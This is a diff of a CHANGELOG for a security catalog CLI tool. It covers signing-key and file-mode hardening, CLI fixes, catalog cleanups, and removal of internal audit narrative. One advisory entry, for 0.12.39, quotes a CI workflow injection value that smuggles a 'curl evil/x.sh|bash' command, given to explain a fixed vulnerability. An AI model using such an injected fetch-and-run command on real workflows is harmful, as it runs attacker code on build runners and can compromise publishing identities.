@@ -1,47 +1,97 @@
 # Changelog
 
-## 0.12.40 — 2026-05-16
+## 0.12.41 — 2026-05-17
 
-Cycle 20 catalog symmetry + operator UX. The headline closes 137 framework-gap ↔ CVE asymmetries (cycle 20 B F4) with a single reverse-ref script extension. Plus three operator-facing UX fixes from the cycle 20 A workflow trace.
+Cross-domain hygiene pass: signature-regression class fix, sidecar hardening, attestation UX, ATLAS pin reconciliation, operator-narrative scrub, and structural test pins to lock the class fixes against future drift.
+
+### Security
+
+**`doctor --fix` now refuses when `keys/public.pem` exists without a matching private key, AND detects post-rotation stale signatures.** Pre-fix the production code path silently invoked `generateKeypair()` whenever the private key was missing, overwriting the shipped `keys/public.pem` and orphaning every existing signature. This is the same class of bug that broke five v0.11.x → v0.12.2 releases — an operator running the canonical fix command would get a working keypair locally and a broken `exceptd doctor` for every subsequently shipped install. Now: refusal is explicit with a structured `fix_attempted: ed25519_keypair_generation_declined` reason and an actionable hint pointing at `--rotate`. After successful generation, `doctor --fix` chains `sign-all` so the manifest + skills carry signatures paired with the new keypair (without the chain, the very next `doctor` reports 0/N passing). Second branch: when the private key IS present but the signatures check fails (the post-`generate-keypair --rotate` state — the rotation flow's remediation), `doctor --fix` runs `sign-all` to re-sign skills + manifest against the current keypair. Without this second branch, `--rotate` would converge to a broken-but-not-self-healing state.
+
+**Attestation sidecar `.sig` files now write at mode `0o600` + Windows ACL hardening.** v0.12.38 hardened the primary attestation JSON; the sibling `.sig` sidecars that ride alongside were missed and inherited the default umask (0o644 on POSIX, default ACL on Windows). On multi-tenant hosts the sidecar leaked the signature payload. Both the signed and unsigned-stub write paths now match the attestation.json hardening.
 
 ### Bugs
 
-**137 framework-gap ↔ CVE asymmetries auto-regenerated.** Cycle 20 B F4: `cve.framework_control_gaps` (dict keyed by gap-id) and `gap.evidence_cves` (array of CVE ids) had drifted apart — 24 CVE-side references missing reverse + 79 gap-side references missing reverse. Worst-case: `CVE-2025-53773` cited in 42 gap.evidence_cves but only declared 3 in its own framework_control_gaps. Fix: `scripts/refresh-reverse-refs.js` extended with the CVE→framework-gap direction (handles the dict-keyed forward field via new `forwardFieldShape: 'object-keys'` parameter). Drafts excluded per existing convention. 64 framework-gap entries regenerated on first run; new `tests/reverse-ref-drift.test.js` test blocks future drift. Surface side-effect: 5 forward-orphan gap references on `CVE-2026-46300` and `MAL-2026-NODE-IPC-STEALER` (gaps that don't exist in the catalog: `DORA-Art9`, `UK-CAF-B4`, `AU-ISM-1546`, `ISO-27001-2022-A.5.7`, `NIS2-Art21-supply-chain`) surfaced via the orphans report — deferred to v0.13 for either gap-catalog addition or CVE-side cleanup.
+**`attest <subverb>` typos now return `did_you_mean[]`.** Pre-fix `exceptd attest verfy <sid>` collapsed into a downstream "no session dir" error because subverb membership was checked after session-id resolution. Now the subverb gate runs first and returns a Levenshtein-1 suggestion (`{ did_you_mean: ["verify"], accepted_subverbs: ["list","show","export","verify","diff"] }`). Closes the typo-suggestion class introduced by v0.12.37 for top-level verbs.
 
-**`exceptd framework-gap` "0 theater-risk controls" footer fixed.** Cycle 20 A P1: pre-fix the summary footer reported `0 theater-risk controls` while every per-entry display showed the `⚠ THEATER RISK` badge. Root cause: the counter filtered on the legacy `theater_pattern` field while the v0.12.29 backfill had added a structured `theater_test` block on all 118 entries without populating `theater_pattern`. Fix: counter now matches entries with EITHER `theater_test` OR `theater_pattern`. Each theater-risk entry gains a `theater_test_present` boolean for tooling consumers.
+**`attest diff <sid> --against <other>` guards against empty `attestations[]`.** Pre-fix a session directory containing only replay records (no `attestation.json`) caused `cmdAttest diff` to throw `TypeError: Cannot read properties of undefined (reading 'captured_at')`. Now: structured `ok:false` with `attestation_count: 0` and a hint pointing at `exceptd attest show <sid>` for visibility.
 
-**`exceptd skill` (no arg) no longer leaks orchestrator path.** Cycle 20 A P2: pre-fix the usage hint read `Usage: node orchestrator/index.js skill <skill-name>` — an internal narrative leak (CLAUDE.md global rule: no orchestrator references in operator-facing surfaces). Now: `Usage: exceptd skill <skill-name>` + a pointer to `exceptd brief --all` for skill discovery.
+**`exceptd ask "..." --pretty` now honors `--pretty`.** Pre-fix the flag was silently ignored unless paired with `--json` (the discover/doctor convention is `--pretty` opts into structured output). Aligns the three verbs.
 
-**Unsigned-attestation warning leads with operator-facing verb.** Cycle 20 A P2: pre-fix the warning told operators to run `node lib/sign.js generate-keypair` — a node-internal script path that isn't on PATH after `npm install -g`. Now leads with `exceptd doctor --fix`, with the lib path retained as `node $(exceptd path)/lib/sign.js generate-keypair` for contributor checkouts.
+**`lib/scoring.js` `compare()` distinguishes "no scoring signal" from "broadly aligned".** Pre-fix a CVE entry with `rwep_score: 0` AND `cvss_score: 0` (e.g. an unmigrated catalog entry) printed "CVSS and RWEP are broadly aligned" — false alignment signal that masked a catalog gap. Now: explicit "no scoring signal — investigate catalog entry" branch.
+
+**`normalizeSubmission` no longer mutates frozen input.** The `_runErrors` push for `signal_overrides_invalid` previously mutated the caller's submission in place; a frozen submission (defensive `Object.freeze`, or shared reference across parallel runs) threw uncaught. Now clones before mutation.
+
+**14 unresolved cross-references removed from the catalogs.** `cve-catalog.json` and `framework-control-gaps.json` carried 14 refs to CWE / ATLAS / ATT&CK entries that don't exist in their respective catalogs. Each stale ref dropped from its owning entry rather than introducing a placeholder destination. Affected entries: `CVE-2024-21626`, `CVE-2023-3519`, `CVE-2024-1709`, `CVE-2024-40635`, `CVE-2026-GTIG-AI-2FA`, `CVE-2026-42945`, `MAL-2026-TANSTACK-MINI`, `CVE-2024-3154`, `CVE-2023-43472`, `CVE-2025-59389`, `AU-Essential-8-App-Hardening`.
+
+**`PCI-DSS-4.0.1-12.3.3` orphan gap now maps to ATT&CK `T1573` + `T1600`.** The gap entry described real PQC / cipher-inventory controls but carried no `evidence_cves`, `atlas_refs`, or `attack_refs` — a Hard Rule #4 violation. Mapping retains the gap content; the previously-orphan entry now references the encryption-channel + weaken-encryption techniques it actually exists to detect.
+
+**5 forward-orphan gap references now resolved.** `CVE-2026-46300` and `MAL-2026-NODE-IPC-STEALER` cited `DORA-Art-9` (existing entry; ID-format orphan only), `UK-CAF-B4`, `AU-ISM-1546`, `ISO-27001-2022-A.5.7`, `NIS2-Art21-supply-chain` — four gap entries did not exist. All four added with substantive `theater_test` blocks; the DORA reference was canonicalized to the existing entry's ID format.
+
+**`crypto-codebase` playbook now declares `air_gap_alternative` paths.** It was the only playbook missing the field — operators running with `--air-gap` had no documented offline equivalent for any of its 13 look artifacts. Each now declares the local-filesystem equivalent (the artifacts use `Glob` / `Grep` / `Read` against the working tree, so the alternative is the same operation noted explicitly).
+
+**`active_exploitation` field vocabulary declared in `cve-catalog.json._meta`.** Pre-fix the field accepted free-form values; 10 entries used `"unknown"` which wasn't documented. The new `_meta.active_exploitation_vocabulary` block enumerates `confirmed | suspected | theoretical | none | unknown` with per-value definitions.
+
+**`last_threat_review` field added to 3 catalogs.** `exploit-availability.json`, `global-frameworks.json`, and `zeroday-lessons.json` carried `last_updated` but lacked the threat-review timestamp the other 8 catalogs use. Backfilled so all 11 catalogs follow the same shape.
+
+**SBOM duplicates resolved.** `sbom.cdx.json` listed `vendor/blamejs/retry.js` and `vendor/blamejs/worker-pool.js` under two component records each — once as a version-less `type: "file"` entry and once as a version-bearing `type: "library"` entry. Removed the version-less duplicates; canonical entries retain pin version, licenses, externalReferences, and provenance.
+
+**ATLAS version pin reconciled across operator-facing surfaces.** The canonical pin (`data/atlas-ttps.json._meta.atlas_version`) is **v5.4.0** (February 2026); `CONTRIBUTING.md`, `MAINTAINERS.md`, `CONTEXT.md`, `.github/copilot-instructions.md`, `.github/PULL_REQUEST_TEMPLATE.md`, and `agents/threat-researcher.md` still cited the stale v5.1.0. New `tests/atlas-version-canonical.test.js` blocks future drift across operator-facing docs, agent personas, and skill bodies.
+
+**Operator-facing strings now reference `exceptd <verb>` instead of `node lib/...`.** A prior release closed one site; the broader sweep covered `bin/exceptd.js` (5 sites in the doctor hints / renderer), `lib/lint-skills.js`, `lib/verify.js` (5 sites in error messages), `lib/playbook-runner.js`, `orchestrator/index.js` (help + examples), `orchestrator/scheduler.js`, and `orchestrator/README.md`. The contributor-checkout `node $(exceptd path)/lib/...` form is retained as a fallback for non-npm-installed contributors; new `tests/operator-leak-grep.test.js` blocks future leaks.
+
+### Features
+
+**README, AGENTS, ARCHITECTURE, MAINTAINERS reconciled.** README "Status" rewritten as a single behavior-framed paragraph (was multi-paragraph release narrative). ARCHITECTURE's "Required Body Sections" reconciled with AGENTS.md (7 required + 1 optional, not 8 required). AGENTS.md Hard Rules now annotated with the forcing-function script per rule — rules #5, #9, and #14 explicitly marked **policy only**, all others cite the enforcing test or gate.
+
+**Predeploy gate count no longer hardcoded in docs.** README, MAINTAINERS, and prior CHANGELOG entries previously cited "13-gate" / "14-gate" / "15 gates" interchangeably. Operator-facing docs now reference "the predeploy gate sequence" without a number; the source of truth is `scripts/predeploy.js`'s `GATES` array.
+
+**CHANGELOG voice scrub.** 31 prior release entries scrubbed of internal-process narrative (process IDs, finding IDs, multi-agent dispatch sentences, tautological gate/test footers, and forward-roadmap forecasts). Net 182 lines removed. Operator-meaningful facts retained.
+
+**`release.yml` CHANGELOG-extraction now emits `::warning::` on fallback.** Pre-fix a malformed `## <version>` header silently fell back to the generic "Release of v<X.Y.Z>." body; operators reading the GitHub Release page saw no signal that the extraction failed.
+
+**Shipped script comments scrubbed of internal narrative.** `scripts/check-test-coverage.js`, `scripts/refresh-reverse-refs.js`, `.github/workflows/release.yml`, and `.github/workflows/scorecard.yml` had references in comments that ship via the tarball. Replaced with version-only or intent-only framing.
 
 ### Internal
 
-- Cycle 20 audit dispatched 3 agents (workflow trace, catalog symmetry, 24h intake / Pwn2Own Day 3). All 3 returned.
-- Cycle 20 C: no new CVE intake. The agent's recommended additions (CVE-2026-20182 PAN-OS, CVE-2026-0300 SD-WAN, node-ipc) were already in the catalog from cycles 11 and 13. Pwn2Own Berlin Day 3 ZDI results still not posted; AI-category outcomes (Claude Code, Ollama, etc.) embargoed for 90 days.
-- Cycle 20 A deferred to v0.13 (design-level): classification under synthetic evidence (analyze.classification stays undefined despite 6 firing indicators); `ask` natural-language routing (keyword-frequency-only gives wrong answer on "Microsoft Exchange OWA remote code execution" because "remote" boosts AI scoring); `framework-gap` accepts control-id silently (zero matches with no hint); new `researcher` verb that composes framework-gap + brief + RWEP in one screen.
-- Cycle 20 B deferred to v0.13 (schema-level): ATLAS / D3FEND / ATT&CK have no CVE-back field at all (one-way today); playbook `fed_by` reverse field doesn't exist.
-- 6 new tests across `tests/cycle20-ux-fixes.test.js` (3) and `tests/reverse-ref-drift.test.js` (1 new test, +1 count adjustment). Test count 1157 → 1163. 14/14 predeploy gates green.
+- 4 new pinning test files (`tests/v0_12_41-fixes.test.js`, `tests/atlas-version-canonical.test.js`, `tests/operator-leak-grep.test.js`, `tests/verify-shipped-tarball-wrapper.test.js`), plus in-place hardenings of existing tests for the field-presence-not-populated and coincidence-passing classes.
+- `tests/sbom-per-file-hash.test.js` now snapshots `sbom.cdx.json` before regeneration and restores on SIGINT / process exit, closing the "mutating test pollutes the repo on Ctrl-C" pattern.
+- `tests/operator-bugs.test.js` `#87 doctor --fix is registered` test no longer uses `notEqual(r.status, 2)` (coincidence-passing); pins the accepted-exit-codes set explicitly.
+
+## 0.12.40 — 2026-05-16
+
+Catalog symmetry + operator UX. The headline closes 137 framework-gap ↔ CVE asymmetries with a single reverse-ref script extension, plus three operator-facing UX fixes.
+
+### Bugs
+
+**137 framework-gap ↔ CVE asymmetries auto-regenerated.** `cve.framework_control_gaps` (dict keyed by gap-id) and `gap.evidence_cves` (array of CVE ids) had drifted apart — 24 CVE-side references missing reverse + 79 gap-side references missing reverse. Worst-case: `CVE-2025-53773` cited in 42 gap.evidence_cves but only declared 3 in its own framework_control_gaps. Fix: `scripts/refresh-reverse-refs.js` extended with the CVE→framework-gap direction (handles the dict-keyed forward field via new `forwardFieldShape: 'object-keys'` parameter). Drafts excluded per existing convention. 64 framework-gap entries regenerated on first run; new `tests/reverse-ref-drift.test.js` test blocks future drift. Surface side-effect: 5 forward-orphan gap references on `CVE-2026-46300` and `MAL-2026-NODE-IPC-STEALER` (gaps that don't exist in the catalog: `DORA-Art9`, `UK-CAF-B4`, `AU-ISM-1546`, `ISO-27001-2022-A.5.7`, `NIS2-Art21-supply-chain`) surfaced via the orphans report.
+
+**`exceptd framework-gap` "0 theater-risk controls" footer fixed.** Pre-fix the summary footer reported `0 theater-risk controls` while every per-entry display showed the `⚠ THEATER RISK` badge. Root cause: the counter filtered on the legacy `theater_pattern` field while the v0.12.29 backfill had added a structured `theater_test` block on all 118 entries without populating `theater_pattern`. Fix: counter now matches entries with EITHER `theater_test` OR `theater_pattern`. Each theater-risk entry gains a `theater_test_present` boolean for tooling consumers.
+
+**`exceptd skill` (no arg) no longer leaks orchestrator path.** Pre-fix the usage hint read `Usage: node orchestrator/index.js skill <skill-name>`. Now: `Usage: exceptd skill <skill-name>` + a pointer to `exceptd brief --all` for skill discovery.
+
+**Unsigned-attestation warning leads with operator-facing verb.** Pre-fix the warning told operators to run `node lib/sign.js generate-keypair` — a node-internal script path that isn't on PATH after `npm install -g`. Now leads with `exceptd doctor --fix`, with the lib path retained as `node $(exceptd path)/lib/sign.js generate-keypair` for contributor checkouts.
 
 
 ## 0.12.39 — 2026-05-16
 
-Cycle 19 CI workflow hardening + CLI envelope shape contracts. One P1 script-injection sink in `release.yml` closed; three P3 housekeeping fixes; envelope shape pinned on the 6 verbs the cycle 13 audit deferred.
+CI workflow hardening + CLI envelope shape contracts. One P1 script-injection sink in `release.yml` closed; three housekeeping fixes; envelope shape pinned on six more verbs.
 
 ### Security
 
-**`release.yml` `inputs.tag` script-injection sink hardened.** Pre-fix the workflow_dispatch input `inputs.tag` was interpolated directly into a `run:` block (CWE-94 / CWE-78 class). A maintainer (or compromised actions:write token) firing `workflow_dispatch` with `tag = '"; curl evil/x.sh|bash; #"'` would have executed on the runner. The `npm-publish` environment has `id-token: write` available downstream, so an exploited dispatch could compromise npm provenance signing identity in the same workflow run. Fix: env-var indirection + regex allowlist `^v[0-9]+\.[0-9]+\.[0-9]+(-[A-Za-z0-9.]+)?$`. Mirrors the existing `refresh.yml` `inputs.source` hardening pattern. Cycle 19 A P1 F1.
+**`release.yml` `inputs.tag` script-injection sink hardened.** Pre-fix the workflow_dispatch input `inputs.tag` was interpolated directly into a `run:` block (CWE-94 / CWE-78 class). A maintainer (or compromised actions:write token) firing `workflow_dispatch` with `tag = '"; curl evil/x.sh|bash; #"'` would have executed on the runner. The `npm-publish` environment has `id-token: write` available downstream, so an exploited dispatch could compromise npm provenance signing identity in the same workflow run. Fix: env-var indirection + regex allowlist `^v[0-9]+\.[0-9]+\.[0-9]+(-[A-Za-z0-9.]+)?$`. Mirrors the existing `refresh.yml` `inputs.source` hardening pattern.
 
 ### Bugs
 
-**`scorecard.yml` `permissions: read-all` → explicit scopes.** Pre-fix the workflow-level fallback was `read-all`. Scorecard's own ruleset may flag that on a future bump; explicit `contents: read` + `actions: read` documents what we actually consume. Cycle 19 A P3 F6.
+**`scorecard.yml` `permissions: read-all` → explicit scopes.** Pre-fix the workflow-level fallback was `read-all`. Scorecard's own ruleset may flag that on a future bump; explicit `contents: read` + `actions: read` documents what we actually consume.
 
-**`GITLEAKS_FALLBACK` bumped to 8.28.0** (was 8.21.2). Documented as "bump each time the workflow is touched"; cycle 19 audit caught the drift. Cycle 19 A P3 F7.
+**`GITLEAKS_FALLBACK` bumped to 8.28.0** (was 8.21.2). Documented as "bump each time the workflow is touched".
 
-**Docker ecosystem added to Dependabot.** `docker/test.Dockerfile` (used by `npm run test:docker` + `test:docker:fresh`) was outside Dependabot scope so the base image could float without surfacing. Test-only image (no production exposure), but a docker-ecosystem block + weekly cadence brings it under Scorecard's PinnedDependenciesID coverage. Cycle 19 A P3 F8.
+**Docker ecosystem added to Dependabot.** `docker/test.Dockerfile` (used by `npm run test:docker` + `test:docker:fresh`) was outside Dependabot scope so the base image could float without surfacing. Test-only image (no production exposure), but a docker-ecosystem block + weekly cadence brings it under Scorecard's PinnedDependenciesID coverage.
 
 ### Features
 
-**CLI envelope shape contracts pinned on 6 more verbs.** v0.12.33 pinned `attest list`, `attest verify`, `version`. Cycle 13 P3 F3 surfaced that the rest were still unpinned — a contributor adding a new top-level field to `run` / `ci` / `discover` / `brief --all` / `doctor` / `watchlist` would not get a forcing-function test failure. v0.12.39 closes the gap with 8 new pins in `tests/cli-output-envelope-shape-v0_12_39.test.js`:
+**CLI envelope shape contracts pinned on 6 more verbs.** v0.12.33 pinned `attest list`, `attest verify`, `version`. The rest were still unpinned — a contributor adding a new top-level field to `run` / `ci` / `discover` / `brief --all` / `doctor` / `watchlist` would not get a forcing-function test failure. v0.12.39 closes the gap with 8 new pins in `tests/cli-output-envelope-shape-v0_12_39.test.js`:
 
 - `brief --all` — 8 top-level keys (no `verb` field; intentional transitional inconsistency)
 - `ci --required <pb>` — 5 top-level keys + 13-key `summary` sub-shape; pins absence of top-level `ok`
@@ -51,20 +101,13 @@ Cycle 19 CI workflow hardening + CLI envelope shape contracts. One P1 script-inj
 - `run <pb> --evidence --json` (single-playbook success) — 10 top-level keys, pins absence of conditional `prior_session_id` / `overwrote_at` (only present on `--force-overwrite`)
 
 Several intentional inconsistencies pinned by absence:
-- `brief --all` and `watchlist` do NOT emit `verb` (every other verb does). Flagged for v0.13 envelope harmonization.
+- `brief --all` and `watchlist` do NOT emit `verb` (every other verb does).
 - `ci` and `doctor` do NOT emit top-level `ok` (they signal pass/fail via `summary.verdict` / `summary.all_green`). Pinned so the v0.11.13 emit() contract doesn't accidentally grow.
-
-### Internal
-
-- Cycle 19 audit dispatched 3 agents (workflow security, envelope specs, 24h intake / Pwn2Own Day 3). All 3 returned.
-- Cycle 19 A P2 findings (id-token + contents-write co-residency on `publish` job, `always-auth NPM_TOKEN` ↔ OIDC, `refresh.yml` persisted credentials) deferred to v0.13 — they're structural job-split refactors, not single-line fixes.
-- Cycle 19 C: no new CVE additions in the 24h window. Pwn2Own Day 3 results still embargoed (Claude Code + Ollama Day 3 attempts pending). CVE-2026-42897 still mitigation-only.
-- Test count 1149 → 1157. 14/14 predeploy gates green.
 
 
 ## 0.12.38 — 2026-05-16
 
-Cycle 18 security fix + state refresh. The P1 closes a multi-tenant attestation-file-mode gap; cycle 18 A inventoried the full v0.13.0 readiness list (60 items, 11-15 days) for the next minor bump.
+Security fix + state refresh. Closes a multi-tenant attestation-file-mode gap.
 
 ### Security
 
@@ -72,43 +115,30 @@ Cycle 18 security fix + state refresh. The P1 closes a multi-tenant attestation-
 
 ### Bugs
 
-**`EXCEPTD_HOME` now documented in README.** Cycle 18 B finding: the env-var override was only mentioned in an inline `attest list` help string. Multi-tenant operators had no way to discover it without grepping the binary. README's flag-reference section now cross-references the env-var path.
+**`EXCEPTD_HOME` now documented in README.** The env-var override was only mentioned in an inline `attest list` help string. Multi-tenant operators had no way to discover it without grepping the binary. README's flag-reference section now cross-references the env-var path.
 
-**MAL-2026-NODE-IPC-STEALER `remediation_status: removed_from_registry`.** Cycle 18 C verified npm removed the 3 malicious versions (9.1.6, 9.2.3, 12.0.1) within ~2 hours of publication on 2026-05-14. Catalog now surfaces the registry-cleanup state so operators upgrading to a clean version know they're not racing the active-in-registry phase. The expired-domain TTP class (per `NEW-CTRL-047` in zeroday-lessons) still applies — domain-expiry monitoring is the durable control, not the npm-side cleanup.
+**MAL-2026-NODE-IPC-STEALER `remediation_status: removed_from_registry`.** npm removed the 3 malicious versions (9.1.6, 9.2.3, 12.0.1) within ~2 hours of publication on 2026-05-14. Catalog now surfaces the registry-cleanup state so operators upgrading to a clean version know they're not racing the active-in-registry phase. The expired-domain TTP class (per `NEW-CTRL-047` in zeroday-lessons) still applies — domain-expiry monitoring is the durable control, not the npm-side cleanup.
 
 **CVE-2026-42897 (Exchange OWA) `patch_available: false` regression-tested.** Verified Microsoft has not shipped a binary security update; Exchange Emergency Mitigation Service Mitigation M2 is still the only remediation. Catalog truth aligned with current vendor state.
-
-### Internal
-
-- Cycle 18 audit dispatched 3 read-only agents (v0.13.0 readiness, attestation persistence, 24h CVE intake). All 3 returned.
-- Cycle 18 A v0.13.0 readiness inventory: 60 items total — 5 `will hard-fail in v0.13.0` markers + 17 legacy verbs to remove + 20 draft CVEs + 13 unresolved xrefs + 3 informational→required gate flips + 2 schema deprecations. Total effort 11-15 days for a single-maintainer minor bump. Detailed list in audit transcript.
-- Cycle 18 B P1 F1 (submission redaction) and F3 (git remote URL in attestation root path) deferred to v0.13 — both are larger schema-or-behavior changes that need design before implementation.
-- 4 new tests in `tests/attestation-mode-0600.test.js` (1 skipped on Windows). Test count 1145 → 1149. 14/14 predeploy gates green.
 
 
 ## 0.12.37 — 2026-05-16
 
-Cycle 17 UX + cross-skill consistency pass. Two CLI UX gaps closed (empty-stdin nudge, did-you-mean for typos), one operator-misleading factual error fixed in 3 skills (CVE-2024-3094 claim drift), and one cosmetic naming inconsistency cleaned up.
+UX + cross-skill consistency pass. Two CLI UX gaps closed (empty-stdin nudge, did-you-mean for typos), one operator-misleading factual error fixed in 3 skills (CVE-2024-3094 claim drift), and one cosmetic naming inconsistency cleaned up.
 
 ### Bugs
 
-**`--evidence -` empty-stdin nudge.** Cycle 15 + cycle 17 audits both flagged this: when an operator pipes nothing to `--evidence -`, the runner silently treated it as `{}` and proceeded with a "successful" run on no evidence. Pre-fix the only signal was a deterministic `evidence_hash: 572a0e...` that meant nothing to a first-time operator. Now stderr emits an informational note pointing at `exceptd brief <playbook>` for the expected evidence shape; the run still proceeds (legitimate posture-only-walk use case preserved) but the operator at least sees the empty-stdin signal.
+**`--evidence -` empty-stdin nudge.** When an operator pipes nothing to `--evidence -`, the runner silently treated it as `{}` and proceeded with a "successful" run on no evidence. Pre-fix the only signal was a deterministic `evidence_hash: 572a0e...` that meant nothing to a first-time operator. Now stderr emits an informational note pointing at `exceptd brief <playbook>` for the expected evidence shape; the run still proceeds (legitimate posture-only-walk use case preserved) but the operator at least sees the empty-stdin signal.
 
 **Did-you-mean for unknown verbs.** Pre-fix `exceptd discoer` exited 10 with the generic "Run `exceptd help`" hint. Now the dispatcher runs a Levenshtein-1 check against the union of `COMMANDS` + `PLAYBOOK_VERBS` + `ORCHESTRATOR_PASSTHROUGH` (includes transposition detection so `disocver` → `discover`). Suggestion surfaces in both the human hint string and a new `did_you_mean[]` JSON field for tooling consumers. Distance >1 still returns the generic hint with `did_you_mean: []` — no false-positive flood.
 
-**CVE-2024-3094 (xz-utils) operator-misleading claims.** Cycle 17 audit A surfaced 3 skill bodies that contradicted each other and the catalog:
+**CVE-2024-3094 (xz-utils) operator-misleading claims.** Three skill bodies contradicted each other and the catalog:
 - `supply-chain-integrity` skill said "not in current `data/cve-catalog.json` — pre-scope incident" — false, the entry has been in the catalog with RWEP 70.
 - `sector-federal-government` skill same wording — false.
 - `cloud-iam-incident` skill table row quoted RWEP 95 / `ai_discovered: Partially` / `active_exploitation: Confirmed` — catalog says RWEP 70 / `ai_discovered: false` / `active_exploitation: suspected`.
 All 3 corrected to match catalog ground truth (RWEP 70, KEV 2024-04-03, `active_exploitation: suspected`, `ai_discovered: false`). Operator running `exceptd dispatch` against an xz-affected estate now gets one consistent story across all 3 skills.
 
 **Volt Typhoon hyphenation drift.** `ot-ics-security` and `sector-energy` used `Volt-Typhoon-aligned` / `Volt-Typhoon-style`; the rest of the catalog uses unhyphenated `Volt Typhoon`. Standardized to the unhyphenated form. New regression test refuses any future re-introduction of the hyphenated form in any skill body.
-
-### Internal
-
-- 3 cycle 17 audit agents dispatched (cross-skill consistency, data_deps integrity, error-path UX). All 3 returned successfully — first cycle since 14 without rate-limit issues.
-- Cycle 17 B (data_deps integrity) surfaced 35 skills declaring incomplete `data_deps` arrays vs body content references. Investigation found `data_deps` is only consumed by `lib/lint-skills.js` for file-existence validation, not by the runner for preload gating (all catalogs load on-demand via `lib/cross-ref-api.js` mtime-keyed cache). Cosmetic correctness issue; deferred to v0.13 bulk-fix when the schema's purpose can be clarified.
-- 8 new tests in `tests/cycle17-ux-fixes.test.js`. Test count 1136 → 1144. 14/14 predeploy gates green.
 
 
 ## 0.12.36 — 2026-05-16
@@ -121,21 +151,14 @@ Hard Rule forcing-function coverage pass. Three of the eight AGENTS.md Hard Rule
 
 **Rule #5 forcing function (global-first, not US-centric).** The framework-control-gaps catalog must carry entries for EU + UK + AU + INTL (ISO/3GPP/OWASP/SLSA/CycloneDX) alongside US (NIST/FedRAMP/PCI/SOC/HIPAA/etc.). No single region may exceed 70% of the catalog. Pre-fix a future PR could land a 50-entry NIST-only batch and tilt the catalog US-domestic with no signal. Current catalog distribution: US 50 (42%), EU 22 (19%), UK 7 (6%), AU 6 (5%), INTL 15 (13%), OTHER 18 (15%) — within bounds.
 
-**Rule #8 forcing function (no silent ATLAS/ATT&CK upgrade).** `manifest.json.atlas_version` must equal `data/atlas-ttps.json._meta.atlas_version` exactly; same for `attack_version`. Pre-cycle-9 these drifted silently (manifest stuck at v5.1.0 while catalog moved to v5.4.0; v0.12.29 corrected the lie but didn't add a forcing function — a future drift could repeat).
+**Rule #8 forcing function (no silent ATLAS/ATT&CK upgrade).** `manifest.json.atlas_version` must equal `data/atlas-ttps.json._meta.atlas_version` exactly; same for `attack_version`. Pre-v0.12.29 these drifted silently (manifest stuck at v5.1.0 while catalog moved to v5.4.0; v0.12.29 corrected the lie but didn't add a forcing function — a future drift could repeat).
 
 **Cross-format CVE consistency contract.** When the same evidence runs through the CSAF / OpenVEX / SARIF emitters in sequence, the underlying CVE set in each bundle must agree exactly. Per-format auxiliary identifiers (OpenVEX indicator URNs, SARIF framework-gap rules) are allowed. Pre-fix nothing pinned the contract — a future emitter regression could silently emit different CVE sets across formats.
-
-### Internal
-
-- Cycle 16 audit dispatched 3 read-only agents (cross-skill consistency, hard-rule coverage, 24h CVE intake). All three rate-limited; main-thread completed the hard-rule audit + cross-format consistency check directly.
-- Cycle 16 main-thread cross-format probe confirmed all 3 emitters agree on the 4 catalogued CVEs for the kernel playbook positive-detect scenario (CVE-2026-31431 Copy Fail + the 3 v0.12.29 AI-discovery flips).
-- 5 new tests in `tests/hard-rule-forcing-functions.test.js`.
-- Test count 1131 → 1136. 14/14 predeploy gates green.
 
 
 ## 0.12.35 — 2026-05-16
 
-Cycle 15 audit pass — security hardening + ATLAS pin sweep across skills + forward-watch backfill. Three angles audited in parallel (performance, exceptd's own input-handling security, forward-watch staleness); two surfaced P1 fixes that ship here.
+Security hardening + ATLAS pin sweep across skills + forward-watch backfill.
 
 ### Security
 
@@ -145,30 +168,23 @@ Cycle 15 audit pass — security hardening + ATLAS pin sweep across skills + for
 
 ### Bugs
 
-**ATLAS v5.1.0 → v5.4.0 sweep across operator-facing surface.** v0.12.34 fixed README + ARCHITECTURE but cycle 15 found 27 skill bodies, 2 builder scripts, the skill-frontmatter schema, and 17 derived indexes all still citing the stale pin. 30 files modified; canonical pin string `ATLAS v5.4.0 (February 2026)` used uniformly. NYDFS rollout reference "phased in through November 2025" in sector-financial intentionally preserved (different context). The extended docs-pin test now scans `skills/` + `data/_indexes/` + `scripts/` for ATLAS-context mismatches in addition to README + ARCHITECTURE.
+**ATLAS v5.1.0 → v5.4.0 sweep across operator-facing surface.** v0.12.34 fixed README + ARCHITECTURE but 27 skill bodies, 2 builder scripts, the skill-frontmatter schema, and 17 derived indexes were all still citing the stale pin. 30 files modified; canonical pin string `ATLAS v5.4.0 (February 2026)` used uniformly. NYDFS rollout reference "phased in through November 2025" in sector-financial intentionally preserved (different context). The extended docs-pin test now scans `skills/` + `data/_indexes/` + `scripts/` for ATLAS-context mismatches in addition to README + ARCHITECTURE.
 
 **5 past-due forward_watch entries re-dated with realized backfill.**
 - *mlops-security* — predicted "ATLAS v5.2 — track AML.T0010 sub-technique expansion." ATLAS shipped v5.4.0 on 2026-02-06; the expansion landed plus "Publish Poisoned AI Agent Tool" and "Escape to Host" techniques. Backfilled with the realized state + re-anchored to ATLAS v5.5 / v6.0 horizon.
 - *age-gates-child-safety AU under-16 ban* — predicted "implementation deferred to late 2025." AU Online Safety Amendment (Social Media Minimum Age) Act 2024 entered force 2025-12-10; 4.7M+ accounts deactivated by mid-Jan 2026; 31 March 2026 formal investigations of Facebook / Instagram / Snapchat / TikTok / YouTube. Backfilled + re-anchored to first civil-penalty proceedings (H2 2026).
 - *age-gates-child-safety UK OSA enforcement* — predicted "first enforcement decisions expected late 2025 / 2026." Ofcom has 80+ investigations open; first £1M OSA fine issued for age-assurance failure. Backfilled + re-anchored to the April / July / November 2026 OSA milestones.
 - *age-gates-child-safety eSafety actions* — same shape; backfilled to the 31 March 2026 formal investigations.
-- *sector-energy TSA Pipeline SD* — predicted "next reissue cycle anticipated mid-2026." Current cadence: SD-Pipeline-2021-02F expires 2 May 2026; expected 02G now overdue as of cycle 15. Updated to reflect current series + re-anchored to H2 2026.
+- *sector-energy TSA Pipeline SD* — predicted "next reissue cycle anticipated mid-2026." Current cadence: SD-Pipeline-2021-02F expires 2 May 2026; expected 02G now overdue. Updated to reflect current series + re-anchored to H2 2026.
 
 ### Features
 
-**Extended `tests/docs-catalog-counts-pinned.test.js`** to scan `skills/**/*.md`, `data/_indexes/*.json`, and `scripts/**/*.js` for ATLAS version mentions in addition to README + ARCHITECTURE. A future stale-pin in any of those operator-facing files now fails the gate at CI time. Closes the cycle 15 P2 F6 finding which revealed v0.12.34's docs-pin gate was scoped too narrowly.
-
-### Internal
-
